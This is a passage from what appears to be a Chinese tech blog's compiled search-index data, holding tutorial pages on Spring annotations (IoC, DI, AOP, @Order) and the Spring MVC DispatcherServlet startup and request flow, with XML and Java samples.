方法，返回被代理的类。更简单的理解就是 factorybean 可以帮我们制造我们想要的 bean，供其他 bean 依赖或使用。',charsets:{cjk:!0}},{title:"注解替代Spring生命周期实现类",frontmatter:{title:"注解替代Spring生命周期实现类",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/205/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/205.%E6%B3%A8%E8%A7%A3%E6%9B%BF%E4%BB%A3Spring%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F%E5%AE%9E%E7%8E%B0%E7%B1%BB.html",relativePath:"01.框架/01.Spring/01.spring/205.注解替代Spring生命周期实现类.md",key:"v-9905be46",path:"/spring/spring/205/",headers:[{level:2,title:"Spring IOC",slug:"spring-ioc",normalizedTitle:"spring ioc",charIndex:151},{level:3,title:"@Bean",slug:"bean",normalizedTitle:"@bean",charIndex:166},{level:3,title:"@Scope",slug:"scope",normalizedTitle:"@scope",charIndex:307},{level:3,title:"@PostConstruct",slug:"postconstruct",normalizedTitle:"@postconstruct",charIndex:352},{level:3,title:"@PreDestroy",slug:"predestroy",normalizedTitle:"@predestroy",charIndex:389},{level:3,title:"Spring DI",slug:"spring-di",normalizedTitle:"spring di",charIndex:426},{level:3,title:"@Autowired",slug:"autowired",normalizedTitle:"@autowired",charIndex:644},{level:3,title:"@Qualifier",slug:"qualifier",normalizedTitle:"@qualifier",charIndex:759},{level:3,title:"@Resource",slug:"resource",normalizedTitle:"@resource",charIndex:936},{level:3,title:"@Value",slug:"value",normalizedTitle:"@value",charIndex:1155},{level:2,title:"Spring AOP",slug:"spring-aop",normalizedTitle:"spring aop",charIndex:1196},{level:3,title:"@Aspect",slug:"aspect",normalizedTitle:"@aspect",charIndex:1211},{level:3,title:"@Before",slug:"before",normalizedTitle:"@before",charIndex:1246},{level:3,title:"@AfterReturning",slug:"afterreturning",normalizedTitle:"@afterreturning",charIndex:1281},{level:3,title:"@AfterThrowing",slug:"afterthrowing",normalizedTitle:"@afterthrowing",charIndex:1335},{level:3,title:"@After",slug:"after",normalizedTitle:"@after",charIndex:1281},{level:3,title:"@Around",slug:"around",normalizedTitle:"@around",charIndex:1420},{level:2,title:"其他注解",slug:"其他注解",normalizedTitle:"其他注解",charIndex:1455},{level:3,title:"@Order",slug:"order",normalizedTitle:"@order",charIndex:1464},{level:4,title:"错误使用",slug:"错误使用",normalizedTitle:"错误使用",charIndex:1765},{level:4,title:"正确使用",slug:"正确使用",normalizedTitle:"正确使用",charIndex:2381},{level:3,title:"@AutoConfigureOrder",slug:"autoconfigureorder",normalizedTitle:"@autoconfigureorder",charIndex:3008}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Spring IOC @Bean @Scope @PostConstruct @PreDestroy Spring DI @Autowired @Qualifier @Resource @Value Spring AOP @Aspect @Before @AfterReturning @AfterThrowing @After @Around 其他注解 @Order 错误使用 正确使用 @AutoConfigureOrder",content:'在早期的 Spring 中，我们都是使用 XML 来进行相应的 Bean 依赖描述和属性描述，但在 Spring Boot 中大多还是习惯使用注解的方式来实现，那这里我就来总结下在 Spring 生命周期中，有哪些类提供了扩展可以给我们实现，以及原先 xml 的方式和注解方式的两种实现方式。\n\n\n# Spring IOC\n\n\n# @Bean\n\n<bean id="student" class="com.xinhua.study.bean.Student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @Scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @PostConstruct\n\ninit-method\n\n\n1\n\n\n\n# @PreDestroy\n\ndestroy-method\n\n\n1\n\n\n\n# Spring DI\n\nAutowired+Qualifier=Resource 这就是他们三者的关系，Autowired 根据类型找实现类，一个接口有多个实现类时需要通过 Qualifier 来指明需要哪个实现类，这是就需要 Autowired+Qualifier 一起使用才可以。Resource 则是不声明名称时按照类型查找效果与 Autowired 相同，声明名称时就等于 Autowired+Qualifier 的组合\n\n\n# @Autowired\n\n@Autowired 可以单独使用。如果单独使用，它将按类型装配。因此，如果在容器中声明了多个相同类型的 bean，则会出现问题，因为 @Autowired 不知道要使用哪个 bean 来注入。因此，使用 @Qualifier 与 @Autowired 一起，通过指定 bean 名称来阐明实际装配的 bean\n\nref="类型"\n\n\n1\n\n\n\n# @Qualifier\n\n@Qualifier 默认按名称装配（这个注解是属于 spring 的），value 默认 @Qualifier (value = "") 空值。\n\nref="类型"\n\n\n1\n\n\n\n# @Resource\n\n@Resource（这个注解属于 J2EE 的），默认按照名称进行装配，名称可以通过 name 属性进行指定， 如果没有指定 name 属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在 setter 方法上默认取属性名进行装配。 当找不到与名称匹配的 bean 时才按照类型进行装配。但是需要注意的是，如果 name 属性一旦指定，就只会按照名称进行装配。\n\nref="类型"\n\n\n1\n\n\n\n# @Value\n\n给基本数据类型赋值\n\nref="基础数据类型"\n\n\n1\n\n\n\n# Spring AOP\n\n\n# @Aspect\n\n声明界面\n\napo:aspect\n\n\n1\n\n\n\n# @Before\n\n前置通知\n\napo:before\n\n\n1\n\n\n\n# @AfterReturning\n\n后置正常通知\n\naop:after-returning\n\n\n1\n\n\n\n# @AfterThrowing\n\n后置异常通知\n\naop:after-throwing\n\n\n1\n\n\n\n# @After\n\n最终通知\n\naop:after\n\n\n1\n\n\n\n# @Around\n\n环绕通知\n\naop:around\n\n\n1\n\n\n\n# 其他注解\n\n\n# @Order\n\n最开始 Order 注解用于切面的优先级指定；在 4.0 之后对它的功能进行了增强，支持集合的注入时，指定集合中 bean 的顺序，并且特别指出了，它对于单实例的 bean 之间的顺序，没有任何影响。\n\n注解 @Order 或者接口 Ordered 的作用是定义 Spring IOC 容器中 Bean 的执行顺序的优先级，而不是定义 Bean 的加载顺序，Bean 的加载顺序不受 @Order 或 Ordered 接口的影响；\n\n@Order 注解不能指定 bean 的加载顺序，它适用于 AOP 的优先级，以及将多个 Bean 注入到集合时，这些 bean 在集合中的顺序\n\n# 错误使用\n\n// 错误使用方法 1\n@Component\n@Order(2)\npublic class OrderA {\n    public OrderA() {\n        System.out.println("************ A ************");\n    }\n}\n\n@Component\n@Order(1)\npublic class OrderB {\n    public OrderB() {\n        System.out.println("************ B ************");\n    }\n}\n// 错误使用方法 2\n@Configuration\npublic class OrderBeanConfig {\n \n    @Order(2)\n    @Bean\n    public OrderC orderC() {\n        return new OrderC();\n    }\n \n    @Order(1)\n    @Bean\n    public OrderD orderD() {\n        return new OrderD();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 正确使用\n\n@Component\n@Order(value = 3)\npublic class AnoBeanA implements IBean{\n    public AnoBeanA() {\n        System.out.println("************ AnoBean A ************");\n    }\n}\n\n@Component\n@Order(value = 2)\npublic class AnoBeanB implements IBean{\n \n    public AnoBeanB() {\n        System.out.println("************ AnoBean B ************");\n    }\n}\n\n@Component\npublic class AnoBean {\n    public AnoBean(List<IBean> anoBeanList) {\n        for (IBean bean : anoBeanList) {\n            System.out.println("in ano testBean: "+ bean.getClass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @AutoConfigureOrder\n\n@AutoConfigureOrder 指定外部依赖的 AutoConfig 的加载顺序（即定义在 / META-INF/spring.factories 文件中的配置 bean 优先级)，在当前工程中使用这个注解并没有什么用，同样的 @AutoConfigureBefore 和 @AutoConfigureAfter 这两个注解的适用范围和 @AutoConfigureOrder 一样',normalizedContent:'在早期的 spring 中，我们都是使用 xml 来进行相应的 bean 依赖描述和属性描述，但在 spring boot 中大多还是习惯使用注解的方式来实现，那这里我就来总结下在 spring 生命周期中，有哪些类提供了扩展可以给我们实现，以及原先 xml 的方式和注解方式的两种实现方式。\n\n\n# spring ioc\n\n\n# @bean\n\n<bean id="student" class="com.xinhua.study.bean.student" scope="prototype" init-method="init()" destroy-method="destroy()"/>\n\n\n1\n\n\n\n# @scope\n\nscope="singleton/prototype"\n\n\n1\n\n\n\n# @postconstruct\n\ninit-method\n\n\n1\n\n\n\n# @predestroy\n\ndestroy-method\n\n\n1\n\n\n\n# spring di\n\nautowired+qualifier=resource 这就是他们三者的关系，autowired 根据类型找实现类，一个接口有多个实现类时需要通过 qualifier 来指明需要哪个实现类，这是就需要 autowired+qualifier 一起使用才可以。resource 则是不声明名称时按照类型查找效果与 autowired 相同，声明名称时就等于 autowired+qualifier 的组合\n\n\n# @autowired\n\n@autowired 可以单独使用。如果单独使用，它将按类型装配。因此，如果在容器中声明了多个相同类型的 bean，则会出现问题，因为 @autowired 不知道要使用哪个 bean 来注入。因此，使用 @qualifier 与 @autowired 一起，通过指定 bean 名称来阐明实际装配的 bean\n\nref="类型"\n\n\n1\n\n\n\n# @qualifier\n\n@qualifier 默认按名称装配（这个注解是属于 spring 的），value 默认 @qualifier (value = "") 空值。\n\nref="类型"\n\n\n1\n\n\n\n# @resource\n\n@resource（这个注解属于 j2ee 的），默认按照名称进行装配，名称可以通过 name 属性进行指定， 如果没有指定 name 属性，当注解写在字段上时，默认取字段名进行按照名称查找，如果注解写在 setter 方法上默认取属性名进行装配。 当找不到与名称匹配的 bean 时才按照类型进行装配。但是需要注意的是，如果 name 属性一旦指定，就只会按照名称进行装配。\n\nref="类型"\n\n\n1\n\n\n\n# @value\n\n给基本数据类型赋值\n\nref="基础数据类型"\n\n\n1\n\n\n\n# spring aop\n\n\n# @aspect\n\n声明界面\n\napo:aspect\n\n\n1\n\n\n\n# @before\n\n前置通知\n\napo:before\n\n\n1\n\n\n\n# @afterreturning\n\n后置正常通知\n\naop:after-returning\n\n\n1\n\n\n\n# @afterthrowing\n\n后置异常通知\n\naop:after-throwing\n\n\n1\n\n\n\n# @after\n\n最终通知\n\naop:after\n\n\n1\n\n\n\n# @around\n\n环绕通知\n\naop:around\n\n\n1\n\n\n\n# 其他注解\n\n\n# @order\n\n最开始 order 注解用于切面的优先级指定；在 4.0 之后对它的功能进行了增强，支持集合的注入时，指定集合中 bean 的顺序，并且特别指出了，它对于单实例的 bean 之间的顺序，没有任何影响。\n\n注解 @order 或者接口 ordered 的作用是定义 spring ioc 容器中 bean 的执行顺序的优先级，而不是定义 bean 的加载顺序，bean 的加载顺序不受 @order 或 ordered 接口的影响；\n\n@order 注解不能指定 bean 的加载顺序，它适用于 aop 的优先级，以及将多个 bean 注入到集合时，这些 bean 在集合中的顺序\n\n# 错误使用\n\n// 错误使用方法 1\n@component\n@order(2)\npublic class ordera {\n    public ordera() {\n        system.out.println("************ a ************");\n    }\n}\n\n@component\n@order(1)\npublic class orderb {\n    public orderb() {\n        system.out.println("************ b ************");\n    }\n}\n// 错误使用方法 2\n@configuration\npublic class orderbeanconfig {\n \n    @order(2)\n    @bean\n    public orderc orderc() {\n        return new orderc();\n    }\n \n    @order(1)\n    @bean\n    public orderd orderd() {\n        return new orderd();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n# 正确使用\n\n@component\n@order(value = 3)\npublic class anobeana implements ibean{\n    public anobeana() {\n        system.out.println("************ anobean a ************");\n    }\n}\n\n@component\n@order(value = 2)\npublic class anobeanb implements ibean{\n \n    public anobeanb() {\n        system.out.println("************ anobean b ************");\n    }\n}\n\n@component\npublic class anobean {\n    public anobean(list<ibean> anobeanlist) {\n        for (ibean bean : anobeanlist) {\n            system.out.println("in ano testbean: "+ bean.getclass())\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# @autoconfigureorder\n\n@autoconfigureorder 指定外部依赖的 autoconfig 的加载顺序（即定义在 / meta-inf/spring.factories 文件中的配置 bean 优先级)，在当前工程中使用这个注解并没有什么用，同样的 @autoconfigurebefore 和 @autoconfigureafter 这两个注解的适用范围和 @autoconfigureorder 一样',charsets:{cjk:!0}},{title:"Spring MVC 之基本工作原理",frontmatter:{title:"Spring MVC 之基本工作原理",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring-mvc/200/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/02.spring%20mv/200.Spring%20MVC%20%E4%B9%8B%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86.html",relativePath:"01.框架/01.Spring/02.spring mv/200.Spring MVC 之工作原理.md",key:"v-808a2772",path:"/spring/spring-mvc/200/",headers:[{level:2,title:"搭建",slug:"搭建",normalizedTitle:"搭建",charIndex:2},{level:2,title:"DispatcherServlet 初始化讲解",slug:"dispatcherservlet-初始化讲解",normalizedTitle:"dispatcherservlet 初始化讲解",charIndex:2998},{level:2,title:"父子容器",slug:"父子容器",normalizedTitle:"父子容器",charIndex:6566},{level:2,title:"代码取代xml配置",slug:"代码取代xml配置",normalizedTitle:"代码取代 xml 配置",charIndex:8920},{level:2,title:"请求实现",slug:"请求实现",normalizedTitle:"请求实现",charIndex:10086}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"搭建 DispatcherServlet 初始化讲解 父子容器 代码取代xml配置 请求实现",content:'# 搭建\n\n 1. 配置 pom.xml\n\n<?xml version="1.0" encoding="UTF-8"?>\n<project xmlns="http://maven.apache.org/POM/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelVersion>4.0.0</modelVersion>\n\n    \x3c!-- spring 包都有 --\x3e\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.7.10</version>\n        <relativePath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupId>com.fengqianrun</groupId>\n    <artifactId>study-springMVC</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    \x3c!-- tomcat 认war包 --\x3e\n    <packaging>war</packaging>\n\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>\n    </properties>\n\n    <dependencies>\n        \x3c!-- 只使用mvc --\x3e\n        <dependency>\n            <groupId>org.springframework</groupId>\n            <artifactId>spring-webmvc</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n 2. 创建 webapp/WEB-INF 目录，并创建 web.xml 文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/WEB-INF 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n 3. 创建 /WEB-INF/spring.xml 文件\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd">\n\n    <context:component-scan base-package="com.fengqianrun.mvc" />\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n 4. 配置 tomcat，Deployment 中配置 war，并修改 Application context\n 5. 访问 url\n\n访问地址为 http://ip:port/tomcat配置的Application context/web.xml里的servlet-name/controller/method\n\n\n1\n\n\n\n# DispatcherServlet 初始化讲解\n\nDispatcherServlet 继承自 HttpServletBean，其最终父类还是 Servlet，只是实现了规范，重写了一些方法。 比如 HttpServletBean 该类重写了 init () 方法，在启动指定 DispatcherServlet 的时候，会调用被重写的 init 方法。整体 init 流程如下：\n\n整个 DispatcherServlet 加载流程：\n1. tomcat会调用servlet的init()方法\n2. HttpServletBean重写了init()方法\n    2.1 读取web.xml里面的内容并封装\n    2.2 执行核心 initServletBean() 方法\n    2.3 initServletBean() 方法调用 initWebApplicationContext()\n3. initWebApplicationContext 方法，用于创建 context 上下文\n    3.1 调用findWebApplicationContext()查询 web.xml 是否自定义了 contextAttribute 这个属性\n    3.2 没用自定义则 createWebApplicationContext(rootContext) 创建 org.springframework.web.context.support.XmlWebApplicationContext 实例，并跟父容器绑定。\n    3.3 给 context 设置环境信息 wac.setEnvironment(getEnvironment());\n    3.4 设置定义 contextConfigLocation(/WEB-INF/spring.xml) 的路径\n    3.5 调用 configureAndRefreshWebApplicationContext() 方法\n4. configureAndRefreshWebApplicationContext 方法，配置context上下文，并初始化bean\n    4.1 设置上下文 ID，为`应用名称`+`servlet-name`\n    4.2 把已有的上下文(cotent)以及配置(config)设置到新的context中\n    4.3 给新的context添加一个ApplicationListener，主要为 ContextRefreshListener，当上下文刷新完毕后通知，该类被通知会调用 **FrameworkServlet.this.onApplicationEvent(event);** 方法，这个方法很重要\n    4.4 调用 refresh() 方法，执行 bean 的初始化操作（spring那一套），执行完调用 this.finishRefresh(); 也就通知到 4.3 中的 ContextRefreshListener对象并调用 FrameworkServlet.this.onApplicationEvent(event);\n5. FrameworkServlet.this.onApplicationEvent(event);调用到DispatcherServlet.initStrategies()方法并会执行以下各种方法： \n    initMultipartResolver(context);\n    initLocaleResolver(context);\n    initThemeResolver(context);\n    initHandlerMappings(context); \n    initHandlerAdapters(context);\n    initHandlerExceptionResolvers(context);\n    initRequestToViewNameTranslator(context);\n    initViewResolvers(context);\n    initFlashMapManager(context);\n6. initHandlerMappings，用于把已经加载到spring容器的对象进行挑拣，把实现了 @RequestMapping | @Controller 的Bean摘出来并得到所有实现了@RequestMapping注解的方法 注册到 mappingRegister 容器中\n    6.1 从容器中读取到实现了HandlerMapping.class 的Bean，这里就是找我们自定义实现了HandlerMapping.class的Bean\n    6.2 如果没有自定义的 HandlerMapping，会加载默认的 HandlerMapping，默认有 BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping,把找到的注册到 Bean容器中\n        6.2.1 RequestMappingHandlerMapping 在注册Bean的时候会执行 afterPropertiesSet()方法，该方法里面会得到所有Bean，并判断类型是否是有 Controller.class 或 RequestMapping.class 注解，如果符合条件代表你是一个 ControllerHandler\n        6.2.2 如果是一个 ControllerHandler，则获取该类中的方法并得到有只含有RequestMapping.class注解的方法，并且解析注解上的参数,把方法注册到一个 mappingRegistry 里\n    6.3 BeanNameUrlHandlerMapping 是由 ApplicationContextAware 感知调用初始化方法的\n        6.3.1 BeanNameUrlHandlerMapping 和 RequestMappingHandlerMapping 解析的方式不一样，BeanNameUrlHandlerMapping得到容器中所有Bean，会判断BeanName的前缀以 \'/\'开头并收集，并且注册到 handlerMap中\n        6.3.2 BeanNameUrlHandlerMapping 和其他controller写法不一样，具体要给类加 @Component("/test") 并且还有实现 implements Controller\n        6.3.3 找到匹配条件的方法把他维护到自己的 handlerMap 中\n    6.4 注意 BeanNameUrlHandlerMapping 和 RequestMappingHandlerMapping维护了不同的 handler 容器，所以相同的请求路径不会报错，如果相同，执行BeanNameUrlHandlerMapping的方法，因为优先级比RequestMappingHandlerMapping靠前\n7. initHandlerAdapters，初始化方法会先把所需要的准备好加载进去\n    7.1 initHandlerAdapters 从spring容器中找加了 @ControllerAdvice 的Bean\n    7.2 得到Bean后判断加了 @ModelAttribute 的注解但不包含有 @RequestMapping注解的方法 存到 modelAttributeAdviceCache中\n    7.3 得到Bean后判断加了 @InitBinder 的方法 存到 initBinderAdviceCache 中\n    7.4 从容其中得到所有实现 RequestBodyAdvice 或 ResponseBodyAdvice 接口，记录下来\n    7.5 初始化 HttpRequestHandlerAdapter、SimpleControllerHandlerAdapter、RequestMappingHandlerAdapter、HandlerFunctionAdapter\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# 父子容器\n\n父子容器，就是在一个 web.xml 里面指定两个 servlet，加载不同的 spring.xml，共享一个 listener 父容器的对象。注意：父容器是会在 servlet 节点之前解析的。父子容器具体实现如下：\n\n<?xml version="1.0" encoding="UTF-8"?>\n\x3c!-- 这个文件是tomcat要去读取的文件，文件路径必须在 webapp/WEB-INF 下，webapp和 java是同级目录 --\x3e\n<web-app>\n    \n    \x3c!-- 父容器 --\x3e\n    <listener>\n        <listener-class>org.springframework.web.context.ContextLoaderListener</listener-class>\n    </listener>\n\n    <context-param>\n        <param-name>contextConfigLocation</param-name>\n        \x3c!-- 描述bean的文件 --\x3e\n        <param-value>/WEB-INF/spring2.xml</param-value>\n    </context-param>\n\n    \x3c!-- 子1 --\x3e\n    <servlet>\n        <servlet-name>app</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app/*</url-pattern>\n    </servlet-mapping>\n\n    \x3c!-- 子2 --\x3e\n    <servlet>\n        <servlet-name>app1</servlet-name>\n        <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\n        <init-param>\n            <param-name>contextConfigLocation</param-name>\n            \x3c!-- 指定spring.xml地址 --\x3e\n            <param-value>/WEB-INF/spring1.xml</param-value>\n        </init-param>\n        \x3c!--数字只是决定初始化顺序\n            默认负数：客户端第一次访问才初始化\n            大于零：的数表示服务器启动时，初始化\n            数字越小越先初始化\n        --\x3e\n        <load-on-startup>1</load-on-startup>\n    </servlet>\n\n    <servlet-mapping>\n        <servlet-name>app1</servlet-name>\n        \x3c!-- 访问路径前缀 --\x3e\n        <url-pattern>/app1/*</url-pattern>\n    </servlet-mapping>\n\n</web-app>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\nContextLoaderListener 会创建一个容器 ApplicationContext，解析配置的 xml 文件，走 spring 常规的 Bean 加载流程。 这个 ApplicationContext 会被做为 servlet 的父容器被加载到 servletContext（map）中，当 servlet 被加载的时候会和父容器进行绑定，详见 DispatcherServlet 初始化讲解 3.2\n\n\n# 代码取代 xml 配置\n\n整体和 xml 是差不多的\n\npublic class MyWebApplicationInitializer implements WebApplicationInitializer {\n    \n    @Override\n    public void onStartup(ServletContext servletContext) throws ServletException {\n        // Load Spring web application configuration\n        AnnotationConfigWebApplicationContext context = new AnnotationConfigWebApplicationContext();\n        context.register(AppConfig.class);\n\n        // Create and register the DispatcherServlet\n        DispatcherServlet servlet = new DispatcherServlet(context);\n        ServletRegistration.Dynamic registration = servletContext.addServlet("app", servlet);\n        registration.setLoadOnStartup(1);\n        registration.addMapping("/app/*");\n    }\n\n    @ComponentScan("com.fengqianrun.mvc")\n    public class AppConfig{\n\n    }\n    \n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\nMyWebApplicationInitializer 被加载是通过 SpringServletContainerInitializer 实现了 ServletContainerInitializer 的规范，在 SpringServletContainerInitializer 中有一个 @HandlesTypes，里面就定义了 WebApplicationInitializer，会把该类加载传入 SpringServletContainerInitializer 的 onStartup 方法，该方法里面继续调用实现了 WebApplicationInitializer 的 onStartup 方法\n\n\n# 请求实现\n\n我们都知道早出写一个 HttpServlet 并实现 service () 转发具体 doGet doPost 并实现业务逻辑。DispatcherServlet 一样实现了 HttpServlet 并重写了 service、doGet、doPost 等方法，实现具体流程是：\n\n1. 由DispatcherServlet的父类FrameworkServlet具体实现了service、doGet、doPost方法\n2. FrameworkServlet会先被调用service()方法，解析方法的请求方式是 get 还是 post，后调用HttpServlet的service()方法进一步判断是调用 doGet 还是 doPost方法\n3. HttpServlet在调用FrameworkServlet具体实现了doGet或doPost方法\n    3.1 \n4. doPost实现会调用FrameworkServlet的子类DispatcherServlet的doService方法\n    4.1 doService 首先会打印请求的信息\n    4.2 把context添加到 request 的请求中\n    4.3 flashMapManager\n    4.4 调用 doDispatch 方法\n5. doDispatch\n    5.1 得到默认的三个 mapping（ BeanNameUrlHandlerMapping,RequestMappingHandlerMapping,RouterFunctionMapping，详细在DispatcherServlet 初始化讲解6.2中）\n    5.2 便利每个 mapping，并得到请求的路径，根据路径去找 handler（这个handler就是DispatcherServlet 初始化讲解6.2.2的方法），如果是BeanNameUrlHandlerMapping找到的是Bean，RequestMappingHandlerMapping找到的是 HanlerMethod 统一为 handler\n    5.3 找到handler后会封装为一个 handler执行链，这个执行链包含了拦截器，所以称为链\n    5.4 由于获取的 handler 是一个object，无法确定是BeanNameUrlHandlerMapping的Bean还是RequestMappingHandlerMapping的HandlerMethod，所以执行 getHandlerAdapter 进行适配\n        5.4.1 把已经加载的 handlerAdapters 进行便利（DispatcherServlet 初始化讲解 7.5）\n        5.4.2 每个 handlerAdapter 实现方式不一样，会有个统一的 supports 方法来判断是否实现了不同 mapping 的要求，并找到合适的 adapter\n            5.4.2.1 如 RequestMappingHandlerMapping 对应的是 RequestMappingHandlerAdapter，adapter 的 supports会判断是否是 HandlerMethod 的实例，是则得到这个 adapter\n        5.4.3 handler执行链开始执行拦截器，会遍历所有的拦截器执行执行前置方法，如果拦截器前置方法返回false则后面不在执行\n        5.4.4 拦截器执行完毕后就可以执行得到的 HandlerAdapter 的 handler 方法，去真正执行 controller 的方法，返回值会封装成 ModelAndView\n            5.4.4.1 检查是否限制了请求方式，比如只支持 POST 请求\n            5.4.4.2 判断是否开启session锁，用于对持有相同session的请求进行并发限制\n            5.4.4.3 执行invokeHandlerMethod方法\n                5.4.4.3.1 找出@InitBinder创建一个 binderFactory 工厂，该工厂是对Method请求参数做类型转换，找的是当前Method或全局的@InitBinder的转换器\n                5.4.4.3.2 生成ModelFactory，把@ModelAttribute的key和value，以及@SessionAttributes的key和value添加到 Model中，可以保障在controller的Model中得到数据\n                5.4.4.3.3 创建一个处理方法的对象，设置方法解析器（解析@RequestParam等注解或对象），返回值解析器（比如加了@ResponseBody要解析成JSON），设置binderFactory\n                5.4.4.3.4 创建 ModelAndViewContainer，给ModelAndViewContainer 添加解析的内容（初始化），然后具体去执行 invokAndHandler(req,ModelAndViewContainer)，得到更多的信息给 ModelAndViewContainer，比如返回结果\n                5.4.4.3.5 最后对 ModelAndViewContainer 进行处理，判断当前请求是否进行了重定向\n        5.4.5 通过返回的 ModelAndView 查找并设置视图\n        5.4.6 执行拦截器后置方法\n        5.4.7 视图渲染\n        5.4.8 再调用拦截的执行完成方法\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n',normalizedContent:'# 搭建\n\n 1. 配置 pom.xml\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    \x3c!-- spring 包都有 --\x3e\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-starter-parent</artifactid>\n        <version>2.7.10</version>\n        <relativepath/> \x3c!-- lookup parent from repository --\x3e\n    </parent>\n\n\n    <groupid>com.fengqianrun</groupid>\n    <artifactid>study-springmvc</artifactid>\n    <version>0.0.1-snapshot</version>\n    \x3c!-- tomcat 